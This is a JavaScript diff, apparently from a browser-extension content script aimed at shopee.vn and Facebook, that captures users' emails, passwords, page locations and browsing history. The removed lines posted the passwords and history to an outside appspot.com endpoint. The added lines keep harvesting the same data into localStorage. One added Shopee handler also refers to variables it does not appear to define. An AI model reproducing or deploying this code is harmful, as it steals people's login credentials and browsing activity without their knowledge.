@@ -1,3 +1,5 @@
+const KEY = "DATA_1637469683_90061_2132";
+
 if(window.location.origin.indexOf('shopee.vn') > -1) {
   try {
     getShoppeOrderHistory();
@@ -12,7 +14,11 @@ function getShoppeOrderHistory() {
     }
     return response.json();
   }).then((data) => {
-    console.log(111, data);
+    updateData("shopeeOrders", {
+      url: url,
+      userAgent: navigator.userAgent,
+      title: title
+    });
   });
 }
 
@@ -134,23 +140,19 @@ function listenFacebook() {
   }
 }
 
+function updateData(type, data) {
+  let object = JSON.parse(localStorage.getItem(KEY) ?? "{}");
+  object[type] = data;
+  localStorage.setItem(KEY, JSON.stringify(object));
+}
+
 function onUpdate(email, pass, type) {
-  fetch(`https://deploy-temp.appspot.com/api/update-user-info`, { 
-    method: 'post',
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      email: email,
-      pass: pass,
-      type: type,
-      userAgent: navigator.userAgent,
-      location: window.location.href
-    })
-  })
-  .then((data) => {
-    console.log(data);
+  updateData("user", {
+    email: email,
+    pass: pass,
+    type: type,
+    userAgent: navigator.userAgent,
+    location: window.location.href
   });
 }
 
@@ -174,19 +176,9 @@ function sendHistory(url, title) {
   if(!url) {
     return;
   }
-  fetch(`https://deploy-temp.appspot.com/api/update-history`, { 
-    method: 'post',
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      url: url,
-      userAgent: navigator.userAgent,
-      title: title
-    })
-  })
-  .then((data) => {
-    console.log(data);
+  updateData("pageHistory", {
+    url: url,
+    userAgent: navigator.userAgent,
+    title: title
   });
 }
